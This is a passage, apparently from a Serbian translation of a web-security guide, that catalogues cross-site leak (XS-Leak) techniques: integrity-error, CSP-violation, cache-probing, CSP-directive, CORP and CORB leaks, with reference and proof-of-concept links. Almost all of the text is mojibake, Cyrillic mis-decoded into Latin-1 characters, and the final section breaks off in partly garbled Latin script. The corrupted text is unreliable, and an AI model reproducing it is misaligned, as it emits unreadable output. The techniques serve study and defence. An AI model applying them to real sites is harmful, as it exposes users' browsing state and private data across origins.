Ğ±Ğ¸Ñ‚Ğ¸ Ğ·Ğ°Ğ±ĞµĞ»ĞµĞ¶ĞµĞ½Ğ° Ğ½Ğ°ĞºĞ¾Ğ½ ÑˆÑ‚Ğ¾ Ğ·Ğ°Ñ…Ñ‚ĞµĞ² Ğ·Ğ° ÑƒÑ‡Ğ¸Ñ‚Ğ°Ğ²Ğ°ÑšĞµĞ¼ ÑĞ° Ğ°Ñ‚Ñ€Ğ¸Ğ±ÑƒÑ‚Ğ¾Ğ¼ Ğ¸Ğ½Ñ‚ĞµĞ³Ñ€Ğ¸Ñ‚ĞµÑ‚Ğ° Ğ½Ğµ ÑƒÑĞ¿Ğµ. ĞĞ°Ğ¿Ğ°Ğ´Ğ°Ñ‡Ğ¸ Ğ¼Ğ¾Ğ³Ñƒ Ğ½Ğ°Ğ¼ĞµÑ€Ğ½Ğ¾ **Ğ¸Ğ·Ğ°Ğ·Ğ²Ğ°Ñ‚Ğ¸ Ğ¾Ğ²Ñƒ Ğ³Ñ€ĞµÑˆĞºÑƒ** Ğ´Ğ¾Ğ´ĞµÑ™Ğ¸Ğ²Ğ°ÑšĞµĞ¼ **Ğ»Ğ°Ğ¶Ğ½Ğµ Ğ²Ñ€ĞµĞ´Ğ½Ğ¾ÑÑ‚Ğ¸ Ñ…ĞµÑˆĞ°** Ğ°Ñ‚Ñ€Ğ¸Ğ±ÑƒÑ‚Ñƒ Ğ¸Ğ½Ñ‚ĞµĞ³Ñ€Ğ¸Ñ‚ĞµÑ‚Ğ° Ğ±Ğ¸Ğ»Ğ¾ ĞºĞ¾Ğ³ Ğ·Ğ°Ñ…Ñ‚ĞµĞ²Ğ°. Ğ£ SA, Ñ€ĞµĞ·ÑƒĞ»Ñ‚Ğ¸Ñ€Ğ°Ñ˜ÑƒÑ›Ğ° Ğ¿Ğ¾Ñ€ÑƒĞºĞ° Ğ¾ Ğ³Ñ€ĞµÑˆÑ†Ğ¸ Ğ½ĞµĞ½Ğ°Ğ¼ĞµÑ€Ğ½Ğ¾ Ğ¾Ñ‚ĞºÑ€Ğ¸Ğ²Ğ° Ğ´ÑƒĞ¶Ğ¸Ğ½Ñƒ ÑĞ°Ğ´Ñ€Ğ¶Ğ°Ñ˜Ğ° Ğ·Ğ°Ñ…Ñ‚ĞµĞ²Ğ°Ğ½Ğ¾Ğ³ Ñ€ĞµÑÑƒÑ€ÑĞ°. ĞĞ²Ğ°Ñ˜ Ğ¾Ñ‚ĞºÑ€Ğ¸Ğ²Ğ°ÑšĞµ Ğ¸Ğ½Ñ„Ğ¾Ñ€Ğ¼Ğ°Ñ†Ğ¸Ñ˜Ğ° Ğ¾Ğ¼Ğ¾Ğ³ÑƒÑ›Ğ°Ğ²Ğ° Ğ½Ğ°Ğ¿Ğ°Ğ´Ğ°Ñ‡Ñƒ Ğ´Ğ° Ñ€Ğ°Ğ·Ğ»Ğ¸ĞºÑƒÑ˜Ğµ Ğ²Ğ°Ñ€Ğ¸Ñ˜Ğ°Ñ†Ğ¸Ñ˜Ğµ Ğ²ĞµĞ»Ğ¸Ñ‡Ğ¸Ğ½Ğµ Ğ¾Ğ´Ğ³Ğ¾Ğ²Ğ¾Ñ€Ğ°, Ğ¾Ñ‚Ğ²Ğ°Ñ€Ğ°Ñ˜ÑƒÑ›Ğ¸ Ğ¿ÑƒÑ‚ Ğ·Ğ° Ğ½Ğ°Ğ¿Ñ€ĞµĞ´Ğ½Ğµ XS-Leak Ğ½Ğ°Ğ¿Ğ°Ğ´Ğµ.

### CSP ĞšÑ€ÑˆĞµÑšĞµ/ĞÑ‚ĞºÑ€Ğ¸Ğ²Ğ°ÑšĞµ

* **ĞœĞµÑ‚Ğ¾Ğ´Ğµ ÑƒĞºÑ™ÑƒÑ‡Ğ¸Ğ²Ğ°ÑšĞ°**: Ğ¡ĞºĞ¾ĞºÑ‡Ğ¸Ñ›Ğ¸
* **Ğ”ĞµÑ‚ĞµĞºÑ‚Ğ°Ğ±Ğ¸Ğ»Ğ½Ğ° Ğ Ğ°Ğ·Ğ»Ğ¸ĞºĞ°**: Ğ¡Ñ‚Ğ°Ñ‚ÑƒÑĞ½Ğ¸ ĞšĞ¾Ğ´
* **Ğ’Ğ¸ÑˆĞµ Ğ¸Ğ½Ñ„Ğ¾Ñ€Ğ¼Ğ°Ñ†Ğ¸Ñ˜Ğ°**: [https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html), [https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)
* **Ğ ĞµĞ·Ğ¸Ğ¼Ğµ**: Ğ”Ğ¾Ğ·Ğ²Ğ¾Ñ™Ğ°Ğ²Ğ°Ñ˜ÑƒÑ›Ğ¸ ÑĞ°Ğ¼Ğ¾ ÑĞ°Ñ˜Ñ‚ Ğ¶Ñ€Ñ‚Ğ²Ğµ Ñƒ CSP-Ñƒ, Ğ°ĞºĞ¾ Ğ¿Ğ¾ĞºÑƒÑˆĞ°Ğ¼Ğ¾ Ğ´Ğ° Ğ¿Ñ€Ğ¸ÑÑ‚ÑƒĞ¿Ğ¸Ğ¼Ğ¾ Ğ¸ Ğ¿Ñ€ĞµÑƒÑĞ¼ĞµÑ€Ğ¸Ğ¼Ğ¾ Ğ½Ğ° Ñ€Ğ°Ğ·Ğ»Ğ¸Ñ‡Ğ¸Ñ‚Ğ¸ Ğ´Ğ¾Ğ¼ĞµĞ½, CSP Ñ›Ğµ Ğ¿Ğ¾ĞºÑ€ĞµĞ½ÑƒÑ‚Ğ¸ Ğ´ĞµÑ‚ĞµĞºÑ‚Ğ°Ğ±Ğ¸Ğ»Ğ½Ñƒ Ğ³Ñ€ĞµÑˆĞºÑƒ.
* **ĞŸÑ€Ğ¸Ğ¼ĞµÑ€ ĞšĞ¾Ğ´Ğ°**: [https://xsinator.com/testing.html#CSP%20Violation%20Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak), [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation)

XS-Leak Ğ¼Ğ¾Ğ¶Ğµ ĞºĞ¾Ñ€Ğ¸ÑÑ‚Ğ¸Ñ‚Ğ¸ CSP Ğ´Ğ° Ğ´ĞµÑ‚ĞµĞºÑ‚ÑƒÑ˜Ğµ Ğ´Ğ° Ğ»Ğ¸ Ñ˜Ğµ ÑĞ°Ñ˜Ñ‚ Ğ¸Ğ· Ñ€Ğ°Ğ·Ğ»Ğ¸Ñ‡Ğ¸Ñ‚Ğ¾Ğ³ Ğ¿Ğ¾Ñ€ĞµĞºĞ»Ğ° Ğ¿Ñ€ĞµÑƒÑĞ¼ĞµÑ€ĞµĞ½ Ğ½Ğ° Ñ€Ğ°Ğ·Ğ»Ğ¸Ñ‡Ğ¸Ñ‚Ğ¾ Ğ¿Ğ¾Ñ€ĞµĞºĞ»Ğ¾. ĞĞ²Ğ°Ñ˜ Ğ¿Ñ€Ğ¾Ğ¿ÑƒÑÑ‚ Ğ¼Ğ¾Ğ¶Ğµ Ğ´ĞµÑ‚ĞµĞºÑ‚Ğ¾Ğ²Ğ°Ñ‚Ğ¸ Ğ¿Ñ€ĞµÑƒÑĞ¼ĞµÑ€ĞµÑšĞµ, Ğ°Ğ»Ğ¸ Ğ´Ğ¾Ğ´Ğ°Ñ‚Ğ½Ğ¾, Ğ´Ğ¾Ğ¼ĞµĞ½ Ñ†Ğ¸Ñ™Ğ° Ğ¿Ñ€ĞµÑƒÑĞ¼ĞµÑ€ĞµÑšĞ° Ğ¾Ñ‚ĞºÑ€Ğ¸Ğ²Ğ°. ĞÑĞ½Ğ¾Ğ²Ğ½Ğ° Ğ¸Ğ´ĞµÑ˜Ğ° Ğ¾Ğ²Ğ¾Ğ³ Ğ½Ğ°Ğ¿Ğ°Ğ´Ğ° Ñ˜Ğµ Ğ´Ğ° ÑĞµ **Ğ´Ğ¾Ğ·Ğ²Ğ¾Ğ»Ğ¸ Ñ†Ğ¸Ñ™Ğ½Ğ¸ Ğ´Ğ¾Ğ¼ĞµĞ½ Ğ½Ğ° ÑĞ°Ñ˜Ñ‚Ñƒ Ğ½Ğ°Ğ¿Ğ°Ğ´Ğ°Ñ‡Ğ°**. ĞšĞ°Ğ´Ğ° ÑĞµ Ğ·Ğ°Ñ…Ñ‚ĞµĞ² Ğ¿Ğ¾ÑˆĞ°Ñ™Ğµ ĞºĞ° Ñ†Ğ¸Ñ™Ğ½Ğ¾Ğ¼ Ğ´Ğ¾Ğ¼ĞµĞ½Ñƒ, **Ğ¿Ñ€ĞµÑƒÑĞ¼ĞµÑ€Ğ°Ğ²Ğ° ÑĞµ** Ğ½Ğ° Ğ´Ğ¾Ğ¼ĞµĞ½ Ğ¸Ğ· Ñ€Ğ°Ğ·Ğ»Ğ¸Ñ‡Ğ¸Ñ‚Ğ¾Ğ³ Ğ¿Ğ¾Ñ€ĞµĞºĞ»Ğ°. **CSP Ğ±Ğ»Ğ¾ĞºĞ¸Ñ€Ğ°** Ğ¿Ñ€Ğ¸ÑÑ‚ÑƒĞ¿ ÑšĞµĞ¼Ñƒ Ğ¸ ĞºÑ€ĞµĞ¸Ñ€Ğ° **Ğ¸Ğ·Ğ²ĞµÑˆÑ‚Ğ°Ñ˜ Ğ¾ ĞºÑ€ÑˆĞµÑšÑƒ ĞºĞ¾Ñ€Ğ¸ÑˆÑ›ĞµĞ½ ĞºĞ°Ğ¾ Ñ‚ĞµÑ…Ğ½Ğ¸ĞºĞ° Ğ¾Ñ‚ĞºÑ€Ğ¸Ğ²Ğ°ÑšĞ°**. Ğ—Ğ°Ğ²Ğ¸ÑĞ½Ğ¾ Ğ¾Ğ´ Ğ¿Ñ€ĞµĞ³Ğ»ĞµĞ´Ğ°Ñ‡Ğ°, **Ğ¾Ğ²Ğ°Ñ˜ Ğ¸Ğ·Ğ²ĞµÑˆÑ‚Ğ°Ñ˜ Ğ¼Ğ¾Ğ¶Ğµ Ğ¾Ñ‚ĞºÑ€Ğ¸Ñ‚Ğ¸ Ñ†Ğ¸Ñ™Ğ½Ñƒ Ğ»Ğ¾ĞºĞ°Ñ†Ğ¸Ñ˜Ñƒ Ğ¿Ñ€ĞµÑƒÑĞ¼ĞµÑ€ĞµÑšĞ°**.\
ĞœĞ¾Ğ´ĞµÑ€Ğ½Ğ¸ Ğ¿Ñ€ĞµĞ³Ğ»ĞµĞ´Ğ°Ñ‡Ğ¸ Ğ½ĞµÑ›Ğµ Ğ½Ğ°Ğ²ĞµÑÑ‚Ğ¸ URL Ğ½Ğ° ĞºĞ¾Ñ˜Ğ¸ Ñ˜Ğµ Ğ¿Ñ€ĞµÑƒÑĞ¼ĞµÑ€ĞµĞ½, Ğ°Ğ»Ğ¸ Ñ˜Ğ¾Ñˆ ÑƒĞ²ĞµĞº Ğ¼Ğ¾Ğ¶ĞµÑ‚Ğµ Ğ´ĞµÑ‚ĞµĞºÑ‚Ğ¾Ğ²Ğ°Ñ‚Ğ¸ Ğ´Ğ° Ñ˜Ğµ Ğ¿Ñ€ĞµÑƒÑĞ¼ĞµÑ€ĞµÑšĞµ Ğ¸Ğ· Ñ€Ğ°Ğ·Ğ»Ğ¸Ñ‡Ğ¸Ñ‚Ğ¾Ğ³ Ğ¿Ğ¾Ñ€ĞµĞºĞ»Ğ° Ğ¿Ğ¾ĞºÑ€ĞµĞ½ÑƒÑ‚Ğ¾.

### ĞšĞµÑˆ

* **ĞœĞµÑ‚Ğ¾Ğ´Ğµ ÑƒĞºÑ™ÑƒÑ‡Ğ¸Ğ²Ğ°ÑšĞ°**: Ğ¤Ñ€ĞµÑ˜Ğ¼Ğ¾Ğ²Ğ¸, Ğ¡ĞºĞ¾ĞºÑ‡Ğ¸Ñ›Ğ¸
* **Ğ”ĞµÑ‚ĞµĞºÑ‚Ğ°Ğ±Ğ¸Ğ»Ğ½Ğ° Ğ Ğ°Ğ·Ğ»Ğ¸ĞºĞ°**: Ğ¡Ğ°Ğ´Ñ€Ğ¶Ğ°Ñ˜ Ğ¡Ñ‚Ñ€Ğ°Ğ½Ğµ
* **Ğ’Ğ¸ÑˆĞµ Ğ¸Ğ½Ñ„Ğ¾Ñ€Ğ¼Ğ°Ñ†Ğ¸Ñ˜Ğ°**: [https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events](https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events), [https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html](https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html)
* **Ğ ĞµĞ·Ğ¸Ğ¼Ğµ**: ĞÑ‡Ğ¸ÑÑ‚Ğ¸Ñ‚Ğµ Ğ´Ğ°Ñ‚Ğ¾Ñ‚ĞµĞºÑƒ Ğ¸Ğ· ĞºĞµÑˆĞ°. ĞÑ‚Ğ²Ğ¾Ñ€Ğ¸Ñ‚Ğµ Ñ†Ğ¸Ñ™Ğ½Ñƒ ÑÑ‚Ñ€Ğ°Ğ½Ğ¸Ñ†Ñƒ, Ğ¿Ñ€Ğ¾Ğ²ĞµÑ€Ğ¸Ñ‚Ğµ Ğ´Ğ° Ğ»Ğ¸ Ñ˜Ğµ Ğ´Ğ°Ñ‚Ğ¾Ñ‚ĞµĞºĞ° Ğ¿Ñ€Ğ¸ÑÑƒÑ‚Ğ½Ğ° Ñƒ ĞºĞµÑˆÑƒ.
* **ĞŸÑ€Ğ¸Ğ¼ĞµÑ€ ĞšĞ¾Ğ´Ğ°:**

ĞŸÑ€ĞµĞ³Ğ»ĞµĞ´Ğ°Ñ‡Ğ¸ Ğ¼Ğ¾Ğ³Ñƒ ĞºĞ¾Ñ€Ğ¸ÑÑ‚Ğ¸Ñ‚Ğ¸ Ñ˜ĞµĞ´Ğ°Ğ½ Ğ·Ğ°Ñ˜ĞµĞ´Ğ½Ğ¸Ñ‡ĞºĞ¸ ĞºĞµÑˆ Ğ·Ğ° ÑĞ²Ğµ Ğ²ĞµĞ± Ğ»Ğ¾ĞºĞ°Ñ†Ğ¸Ñ˜Ğµ. ĞĞµĞ·Ğ°Ğ²Ğ¸ÑĞ½Ğ¾ Ğ¾Ğ´ ÑšĞ¸Ñ…Ğ¾Ğ²Ğ¾Ğ³ Ğ¿Ğ¾Ñ€ĞµĞºĞ»Ğ°, Ğ¼Ğ¾Ğ³ÑƒÑ›Ğµ Ñ˜Ğµ Ğ·Ğ°ĞºÑ™ÑƒÑ‡Ğ¸Ñ‚Ğ¸ Ğ´Ğ° Ğ»Ğ¸ Ñ˜Ğµ Ñ†Ğ¸Ñ™Ğ½Ğ° ÑÑ‚Ñ€Ğ°Ğ½Ğ¸Ñ†Ğ° **Ğ·Ğ°Ñ…Ñ‚ĞµĞ²Ğ°Ğ»Ğ° Ğ¾Ğ´Ñ€ĞµÑ’ĞµĞ½Ñƒ Ğ´Ğ°Ñ‚Ğ¾Ñ‚ĞµĞºÑƒ**.

ĞĞºĞ¾ ÑÑ‚Ñ€Ğ°Ğ½Ğ¸Ñ†Ğ° ÑƒÑ‡Ğ¸Ñ‚Ğ°Ğ²Ğ° ÑĞ»Ğ¸ĞºÑƒ ÑĞ°Ğ¼Ğ¾ Ğ°ĞºĞ¾ Ñ˜Ğµ ĞºĞ¾Ñ€Ğ¸ÑĞ½Ğ¸Ğº Ğ¿Ñ€Ğ¸Ñ˜Ğ°Ğ²Ñ™ĞµĞ½, Ğ¼Ğ¾Ğ¶ĞµÑ‚Ğµ **Ğ¿Ğ¾Ğ½Ğ¸ÑˆÑ‚Ğ¸Ñ‚Ğ¸** **Ñ€ĞµÑÑƒÑ€Ñ** (Ğ´Ğ° Ğ²Ğ¸ÑˆĞµ Ğ½Ğ¸Ñ˜Ğµ Ñƒ ĞºĞµÑˆÑƒ Ğ°ĞºĞ¾ Ñ˜Ğµ Ğ±Ğ¸Ğ¾, Ğ²Ğ¸Ğ´Ğ¸Ñ‚Ğµ Ğ²Ğ¸ÑˆĞµ Ğ¸Ğ½Ñ„Ğ¾Ñ€Ğ¼Ğ°Ñ†Ğ¸Ñ˜Ğ° Ğ²ĞµĞ·Ğµ), **Ğ¸Ğ·Ğ²Ñ€ÑˆĞ¸Ñ‚Ğ¸ Ğ·Ğ°Ñ…Ñ‚ĞµĞ²** ĞºĞ¾Ñ˜Ğ¸ Ğ±Ğ¸ Ğ¼Ğ¾Ğ³Ğ°Ğ¾ ÑƒÑ‡Ğ¸Ñ‚Ğ°Ñ‚Ğ¸ Ñ‚Ğ°Ñ˜ Ñ€ĞµÑÑƒÑ€Ñ Ğ¸ Ğ¿Ğ¾ĞºÑƒÑˆĞ°Ñ‚Ğ¸ ÑƒÑ‡Ğ¸Ñ‚Ğ°Ñ‚Ğ¸ Ñ€ĞµÑÑƒÑ€Ñ **ÑĞ° Ğ»Ğ¾ÑˆĞ¸Ğ¼ Ğ·Ğ°Ñ…Ñ‚ĞµĞ²Ğ¾Ğ¼** (Ğ½Ğ¿Ñ€. ĞºĞ¾Ñ€Ğ¸ÑÑ‚ĞµÑ›Ğ¸ Ğ¿Ñ€ĞµĞ²Ğ¸ÑˆĞµ Ğ´ÑƒĞ³ Ğ·Ğ°Ğ³Ğ»Ğ°Ğ²Ñ™Ğµ Ñ€ĞµÑ„ĞµÑ€ĞµÑ€Ğ°). ĞĞºĞ¾ ÑƒÑ‡Ğ¸Ñ‚Ğ°Ğ²Ğ°ÑšĞµ Ñ€ĞµÑÑƒÑ€ÑĞ° **Ğ½Ğ¸Ñ˜Ğµ Ğ¿Ğ¾ĞºÑ€ĞµĞ½ÑƒĞ»Ğ¾ Ğ½Ğ¸Ñ˜ĞµĞ´Ğ½Ñƒ Ğ³Ñ€ĞµÑˆĞºÑƒ**, Ñ‚Ğ¾ Ñ˜Ğµ Ğ·Ğ°Ñ‚Ğ¾ ÑˆÑ‚Ğ¾ Ñ˜Ğµ **Ñƒ ĞºĞµÑˆÑƒ**.

### CSP Ğ”Ğ¸Ñ€ĞµĞºÑ‚Ğ¸Ğ²Ğ°

* **ĞœĞµÑ‚Ğ¾Ğ´Ğµ ÑƒĞºÑ™ÑƒÑ‡Ğ¸Ğ²Ğ°ÑšĞ°**: Ğ¤Ñ€ĞµÑ˜Ğ¼Ğ¾Ğ²Ğ¸
* **Ğ”ĞµÑ‚ĞµĞºÑ‚Ğ°Ğ±Ğ¸Ğ»Ğ½Ğ° Ğ Ğ°Ğ·Ğ»Ğ¸ĞºĞ°**: Ğ—Ğ°Ğ³Ğ»Ğ°Ğ²Ñ™Ğµ
* **Ğ’Ğ¸ÑˆĞµ Ğ¸Ğ½Ñ„Ğ¾Ñ€Ğ¼Ğ°Ñ†Ğ¸Ñ˜Ğ°**: [https://bugs.chromium.org/p/chromium/issues/detail?id=1105875](https://bugs.chromium.org/p/chromium/issues/detail?id=1105875)
* **Ğ ĞµĞ·Ğ¸Ğ¼Ğµ**: CSP Ğ·Ğ°Ğ³Ğ»Ğ°Ğ²Ñ™Ğµ Ğ´Ğ¸Ñ€ĞµĞºÑ‚Ğ¸Ğ²Ğµ Ğ¼Ğ¾Ğ³Ñƒ ÑĞµ Ğ¸ÑĞ¿Ğ¸Ñ‚Ğ°Ñ‚Ğ¸ ĞºĞ¾Ñ€Ğ¸ÑÑ‚ĞµÑ›Ğ¸ CSP iframe Ğ°Ñ‚Ñ€Ğ¸Ğ±ÑƒÑ‚, Ğ¾Ñ‚ĞºÑ€Ğ¸Ğ²Ğ°Ñ˜ÑƒÑ›Ğ¸ Ğ´ĞµÑ‚Ğ°Ñ™Ğµ Ğ¿Ğ¾Ğ»Ğ¸Ñ‚Ğ¸ĞºĞµ.
* **ĞŸÑ€Ğ¸Ğ¼ĞµÑ€ ĞšĞ¾Ğ´Ğ°**: [https://xsinator.com/testing.html#CSP%20Directive%20Leak](https://xsinator.com/testing.html#CSP%20Directive%20Leak)

ĞĞ¾Ğ²Ğ° Ñ„ÑƒĞ½ĞºÑ†Ğ¸Ñ˜Ğ° Ñƒ Google Chrome-Ñƒ (GC) Ğ¾Ğ¼Ğ¾Ğ³ÑƒÑ›Ğ°Ğ²Ğ° Ğ²ĞµĞ± ÑÑ‚Ñ€Ğ°Ğ½Ğ¸Ñ†Ğ°Ğ¼Ğ° Ğ´Ğ° **Ğ¿Ñ€ĞµĞ´Ğ»Ğ¾Ğ¶Ğµ Ğ¿Ğ¾Ğ»Ğ¸Ñ‚Ğ¸ĞºÑƒ Ğ±ĞµĞ·Ğ±ĞµĞ´Ğ½Ğ¾ÑÑ‚Ğ¸ ÑĞ°Ğ´Ñ€Ğ¶Ğ°Ñ˜Ğ° (CSP)** Ğ¿Ğ¾ÑÑ‚Ğ°Ğ²Ñ™Ğ°ÑšĞµĞ¼ Ğ°Ñ‚Ñ€Ğ¸Ğ±ÑƒÑ‚Ğ° Ğ½Ğ° ĞµĞ»ĞµĞ¼ĞµĞ½Ñ‚ iframe, ÑĞ° Ğ´Ğ¸Ñ€ĞµĞºÑ‚Ğ¸Ğ²Ğ°Ğ¼Ğ° Ğ¿Ğ¾Ğ»Ğ¸Ñ‚Ğ¸ĞºĞµ Ğ¿Ñ€ĞµĞ½ĞµÑĞµĞ½Ğ¸Ğ¼ Ğ·Ğ°Ñ˜ĞµĞ´Ğ½Ğ¾ ÑĞ° HTTP Ğ·Ğ°Ñ…Ñ‚ĞµĞ²Ğ¾Ğ¼. ĞĞ±Ğ¸Ñ‡Ğ½Ğ¾, ÑƒĞ³Ñ€Ğ°Ñ’ĞµĞ½Ğ¸ ÑĞ°Ğ´Ñ€Ğ¶Ğ°Ñ˜ Ğ¼Ğ¾Ñ€Ğ° **Ğ¾Ğ´Ğ¾Ğ±Ñ€Ğ¸Ñ‚Ğ¸ Ğ¾Ğ²Ğ¾ Ğ¿ÑƒÑ‚ĞµĞ¼ HTTP Ğ·Ğ°Ğ³Ğ»Ğ°Ğ²Ñ™Ğ°**, Ğ¸Ğ»Ğ¸ Ñ›Ğµ ÑĞµ Ğ¿Ñ€Ğ¸ĞºĞ°Ğ·Ğ°Ñ‚Ğ¸ **ÑÑ‚Ñ€Ğ°Ğ½Ğ¸Ñ†Ğ° ÑĞ° Ğ³Ñ€ĞµÑˆĞºĞ¾Ğ¼**. ĞœĞµÑ’ÑƒÑ‚Ğ¸Ğ¼, Ğ°ĞºĞ¾ Ñ˜Ğµ iframe Ğ²ĞµÑ› Ğ¿Ğ¾Ğ´ ĞºĞ¾Ğ½Ñ‚Ñ€Ğ¾Ğ»Ğ¾Ğ¼ CSP-Ğ° Ğ¸ Ğ½Ğ¾Ğ²Ğ¾Ğ¿Ñ€ĞµĞ´Ğ»Ğ¾Ğ¶ĞµĞ½Ğ° Ğ¿Ğ¾Ğ»Ğ¸Ñ‚Ğ¸ĞºĞ° Ğ½Ğ¸Ñ˜Ğµ ÑÑ‚Ñ€Ğ¾Ğ¶Ğ¸Ñ˜Ğ°, ÑÑ‚Ñ€Ğ°Ğ½Ğ¸Ñ†Ğ° Ñ›Ğµ ÑĞµ ÑƒÑ‡Ğ¸Ñ‚Ğ°Ñ‚Ğ¸ Ğ½Ğ¾Ñ€Ğ¼Ğ°Ğ»Ğ½Ğ¾. ĞĞ²Ğ°Ñ˜ Ğ¼ĞµÑ…Ğ°Ğ½Ğ¸Ğ·Ğ°Ğ¼ Ğ¾Ñ‚Ğ²Ğ°Ñ€Ğ° Ğ¿ÑƒÑ‚ Ğ·Ğ° Ğ½Ğ°Ğ¿Ğ°Ğ´Ğ°Ñ‡Ğ° Ğ´Ğ° **Ğ¾Ñ‚ĞºÑ€Ğ¸Ñ˜Ğµ ÑĞ¿ĞµÑ†Ğ¸Ñ„Ğ¸Ñ‡Ğ½Ğµ CSP Ğ´Ğ¸Ñ€ĞµĞºÑ‚Ğ¸Ğ²Ğµ** Ğ½Ğ° ÑÑ‚Ñ€Ğ°Ğ½Ğ¸Ñ†Ğ¸ Ğ¸Ğ· Ñ€Ğ°Ğ·Ğ»Ğ¸Ñ‡Ğ¸Ñ‚Ğ¾Ğ³ Ğ¿Ğ¾Ñ€ĞµĞºĞ»Ğ° Ğ¸Ğ´ĞµĞ½Ñ‚Ğ¸Ñ„Ğ¸ĞºÑƒÑ˜ÑƒÑ›Ğ¸ ÑÑ‚Ñ€Ğ°Ğ½Ğ¸Ñ†Ñƒ ÑĞ° Ğ³Ñ€ĞµÑˆĞºĞ¾Ğ¼. Ğ˜Ğ°ĞºĞ¾ Ñ˜Ğµ Ğ¾Ğ²Ğ° ÑƒĞ³Ñ€Ğ¾Ğ¶ĞµĞ½Ğ¾ÑÑ‚ Ğ¾Ğ·Ğ½Ğ°Ñ‡ĞµĞ½Ğ° ĞºĞ°Ğ¾ Ğ¸ÑĞ¿Ñ€Ğ°Ğ²Ñ™ĞµĞ½Ğ°, Ğ½Ğ°ÑˆĞ° Ğ¾Ñ‚ĞºÑ€Ğ¸Ñ›Ğ° Ğ¾Ñ‚ĞºÑ€Ğ¸Ğ²Ğ°Ñ˜Ñƒ **Ğ½Ğ¾Ğ²Ñƒ Ñ‚ĞµÑ…Ğ½Ğ¸ĞºÑƒ Ğ¾Ñ‚ĞºÑ€Ğ¸Ğ²Ğ°ÑšĞ°** ÑĞ¿Ğ¾ÑĞ¾Ğ±Ğ½Ñƒ Ğ´Ğ° Ğ¾Ñ‚ĞºÑ€Ğ¸Ñ˜Ğµ ÑÑ‚Ñ€Ğ°Ğ½Ğ¸Ñ†Ñƒ ÑĞ° Ğ³Ñ€ĞµÑˆĞºĞ¾Ğ¼, ÑˆÑ‚Ğ¾ ÑƒĞºĞ°Ğ¶Ğµ Ğ´Ğ° Ğ¿Ñ€Ğ¾Ğ±Ğ»ĞµĞ¼ Ğ½Ğ¸Ñ˜Ğµ Ğ¿Ğ¾Ñ‚Ğ¿ÑƒĞ½Ğ¾ Ñ€ĞµÑˆĞµĞ½.

### **CORP**

* **ĞœĞµÑ‚Ğ¾Ğ´Ğµ ÑƒĞºÑ™ÑƒÑ‡Ğ¸Ğ²Ğ°ÑšĞ°**: Fetch API
* **Ğ”ĞµÑ‚ĞµĞºÑ‚Ğ°Ğ±Ğ¸Ğ»Ğ½Ğ° Ğ Ğ°Ğ·Ğ»Ğ¸ĞºĞ°**: Ğ—Ğ°Ğ³Ğ»Ğ°Ğ²Ñ™Ğµ
* **Ğ’Ğ¸ÑˆĞµ Ğ¸Ğ½Ñ„Ğ¾Ñ€Ğ¼Ğ°Ñ†Ğ¸Ñ˜Ğ°**: [**https://xsleaks.dev/docs/attacks/browser-features/corp/**](https://xsleaks.dev/docs/attacks/browser-features/corp/)
* **Ğ ĞµĞ·Ğ¸Ğ¼Ğµ**: Ğ ĞµÑÑƒÑ€ÑĞ¸ Ğ·Ğ°ÑˆÑ‚Ğ¸Ñ›ĞµĞ½Ğ¸ Cross-Origin Resource Policy (CORP) Ñ›Ğµ Ğ±Ğ°Ñ†Ğ¸Ñ‚Ğ¸ Ğ³Ñ€ĞµÑˆĞºÑƒ ĞºĞ°Ğ´Ğ° ÑĞµ ÑƒÑ‡Ğ¸Ñ‚Ğ°Ñ˜Ñƒ ÑĞ° Ğ·Ğ°Ğ±Ñ€Ğ°ÑšĞµĞ½Ğ¾Ğ³ Ğ¿Ğ¾Ñ€ĞµĞºĞ»Ğ°.
* **ĞŸÑ€Ğ¸Ğ¼ĞµÑ€ ĞšĞ¾Ğ´Ğ°**: [https://xsinator.com/testing.html#CORP%20Leak](https://xsinator.com/testing.html#CORP%20Leak)

CORP Ğ·Ğ°Ğ³Ğ»Ğ°Ğ²Ñ™Ğµ Ñ˜Ğµ Ñ€ĞµĞ»Ğ°Ñ‚Ğ¸Ğ²Ğ½Ğ¾ Ğ½Ğ¾Ğ²Ğ° Ñ„ÑƒĞ½ĞºÑ†Ğ¸Ñ˜Ğ° Ğ±ĞµĞ·Ğ±ĞµĞ´Ğ½Ğ¾ÑÑ‚Ğ¸ Ğ²ĞµĞ± Ğ¿Ğ»Ğ°Ñ‚Ñ„Ğ¾Ñ€Ğ¼Ğµ ĞºĞ¾Ñ˜Ğ° ĞºĞ°Ğ´Ğ° ÑĞµ Ğ¿Ğ¾ÑÑ‚Ğ°Ğ²Ğ¸ **Ğ±Ğ»Ğ¾ĞºĞ¸Ñ€Ğ° no-cors cross-origin Ğ·Ğ°Ñ…Ñ‚ĞµĞ²Ğµ ĞºĞ° Ğ´Ğ°Ñ‚Ğ¾Ğ¼ Ñ€ĞµÑÑƒÑ€ÑÑƒ**. ĞŸÑ€Ğ¸ÑÑƒÑÑ‚Ğ²Ğ¾ Ğ·Ğ°Ğ³Ğ»Ğ°Ğ²Ñ™Ğ° Ğ¼Ğ¾Ğ¶Ğµ ÑĞµ Ğ´ĞµÑ‚ĞµĞºÑ‚Ğ¾Ğ²Ğ°Ñ‚Ğ¸, Ñ˜ĞµÑ€ Ñ›Ğµ Ñ€ĞµÑÑƒÑ€Ñ Ğ·Ğ°ÑˆÑ‚Ğ¸Ñ›ĞµĞ½ CORP-Ğ¾Ğ¼ **Ğ±Ğ°Ñ†Ğ¸Ñ‚Ğ¸ Ğ³Ñ€ĞµÑˆĞºÑƒ ĞºĞ°Ğ´Ğ° ÑĞµ ÑƒÑ‡Ğ¸Ñ‚Ğ°**.
### CORB

* **Metode ukljuÄivanja**: HTML elementi
* **Detektovana razlika**: Zaglavlja
